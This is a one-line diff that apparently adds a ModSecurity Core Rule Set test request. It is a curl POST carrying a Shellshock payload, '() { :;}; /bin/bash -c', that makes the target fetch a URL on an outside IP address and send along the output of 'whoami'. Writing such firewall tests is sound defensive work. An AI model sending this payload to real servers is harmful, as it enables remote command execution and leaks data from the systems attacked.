@@ -1,0 +1,1 @@
+curl -X POST http://hello.app:4080 "Host: localhost" -H "User-Agent: ModSecurity CRS 3 Tests" -d "() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=`whoami`"" -m 1
